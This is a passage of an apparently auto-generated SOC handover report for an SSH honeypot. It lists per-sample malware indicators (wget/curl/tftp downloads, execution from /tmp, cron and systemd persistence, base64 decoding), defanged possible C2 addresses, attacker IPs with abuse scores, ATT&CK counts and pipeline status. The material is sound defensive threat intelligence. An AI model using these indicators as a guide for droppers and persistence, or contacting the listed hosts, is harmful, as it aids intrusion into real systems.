- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `139.19.117[.]129` | DE | Max-Planck-Institut fuer Informatik | **100** ⚠️ | 50 |
| `222.113.196[.]55` | KR | Korea Telecom | **100** ⚠️ | 19 |
| `165.1.75[.]106` | US | Oracle Corporation | **100** ⚠️ | 3 |
| `113.117.242[.]174` | CN | CHINANET Guangdong province network | **100** ⚠️ | 0 |
| `195.96.139[.]54` | GB | Driftnet Ltd | **100** ⚠️ | 11 |
| `132.148.30[.]167` | US | GoDaddy.com, LLC | **100** ⚠️ | 25 |
| `36.137.242[.]65` | CN | China Mobile Communications Corporation | **100** ⚠️ | 7 |
| `101.96.202[.]48` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 41 |
| `211.194.41[.]69` | KR | Korea Telecom | **100** ⚠️ | 12 |
| `3.91.61[.]197` | US | Amazon Data Services Northern Virginia | **100** ⚠️ | 19 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 41 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 23 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 5 |

---

## 🔕 False Positive Summary (14 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 74 cases |
| Tool 34  | Credential Extractor        | ✅ 2056 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 19 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 57 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 14 filtered (18.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 31 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 30 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 22 priority case(s) shown individually · 34 recon entry/entries in table (4 group(s) consolidating 8 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-12T03:09:18Z_
